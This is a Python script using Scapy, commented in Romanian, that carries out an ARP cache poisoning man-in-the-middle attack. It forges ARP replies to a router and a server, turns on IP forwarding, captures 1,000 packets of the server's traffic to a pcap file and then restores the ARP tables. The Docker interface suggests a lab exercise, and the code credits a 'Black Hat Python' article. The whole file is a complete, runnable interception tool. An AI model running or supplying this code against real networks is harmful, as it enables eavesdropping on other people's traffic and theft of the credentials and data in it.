from scapy.all import *
import sys
import threading
import time
import signal
import os
from scapy.layers.l2 import ARP

# parametrii pt atac
ip_router = '198.7.0.1'  # ip router, Gateway
ip_server = '198.7.0.2'  # ip server, Target
nr_pachete = 1000  # nr pachete de capturat
conf.iface = 'docker0'  # interfata de retea utilizata

# fct pt restaurarea retelei la starea initiala prin trimiterea de pachete ARP corecte
# fct trimite pachete ARP legitime pt a corecta informatiile ARP pe server si router
def network_restore(ip_router, mac_router, ip_server, mac_server):
    send(ARP(op=2, hwdst='ff:ff:ff:ff:ff:ff', pdst=ip_router, hwsrc=mac_server, psrc=ip_server), count=5)
    send(ARP(op=2, hwdst='ff:ff:ff:ff:ff:ff', pdst=ip_server, hwsrc=mac_router, psrc=ip_router), count=5)
    print('[*] Dezactivam IP forwarding')
    # dezactivam IP forwarding
    os.system('sysctl -w net.ipv4.ip_forward=0')
    # oprirea scriptului
    os.kill(os.getpid(), signal.SIGTERM)

# fct pt trimiterea constanta a pachetelor ARP false pt a intercepta traficul
# fct trimite pachete ARP false pt a pacali serverul si routerul sa creada ca middle este destinatia corecta
def atac_arp_poison(ip_router, mac_router, ip_server, mac_server):
    print('[*] Inceput atac ARP poison [CTRL-C pentru oprire]')
    try:
        while True:
            print('Trimitem un pachet ARP fals catre SERVER')
            send(ARP(op=2, pdst=ip_router, hwdst=mac_router, psrc=ip_server))
            print('Trimitem un pachet ARP fals catre ROUTER')
            send(ARP(op=2, pdst=ip_server, hwdst=mac_server, psrc=ip_router))
            time.sleep(2)
    except KeyboardInterrupt:
        # oprirea atacului si restaurarea retelei la starea initiala
        print('[*] Oprire atac ARP poison. Restaurare retea')
        network_restore(ip_router, mac_router, ip_server, mac_server)

# inceputul scriptului
print('[*] Incepe script-ul: arp_spoof.py')
print('[*] Activam IP forwarding')
# activam IP forwarding pe Linux
os.system('sysctl -w net.ipv4.ip_forward=1')
print(f'[*] Adresa IP a routerului: {ip_router}')
print(f'[*] Adresa IP a serverului: {ip_server}')

mac_router = '02:42:c6:0a:00:01'  # adresa MAC a routerului
print(f'[*] Adresa MAC a routerului: {mac_router}')

mac_server = '02:42:c6:0a:00:03'  # adresa MAC a serverului
print(f'[*] Adresa MAC a serverului: {mac_server}')

# cream un thread care transmite constant pachete ARP false
thread_poison = threading.Thread(target=atac_arp_poison, args=(ip_router, mac_router, ip_server, mac_server))
thread_poison.start()

# fct pt a captura traficul si a-l salva intr-un fisier
# acest segment de cod captureaza pachetele de la adresa IP a serverului si le salveaza intr-un fisier
try:
    filtru_sniff = 'ip host ' + ip_server  # definim filtrul pentru sniffing
    print(f'[*] Incepem capturarea traficului. Numar pachete: {nr_pachete}. Filtru: {filtru_sniff}')
    pachete = sniff(filter=filtru_sniff, iface=conf.iface, count=nr_pachete)  # capturam pachetele
    wrpcap(ip_server + '_capture.pcap', pachete)  # salvam pachetele capturate intr-un fisier
    print(f'[*] Oprire capturare traficului..Restaurare retea')
    network_restore(ip_router, mac_router, ip_server, mac_server)  # restauram reteaua la starea initiala
except KeyboardInterrupt:
    print(f'[*] Oprire capturare traficului..Restaurare retea')
    network_restore(ip_router, mac_router, ip_server, mac_server)
    sys.exit(0)

# Sursa:
# https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242
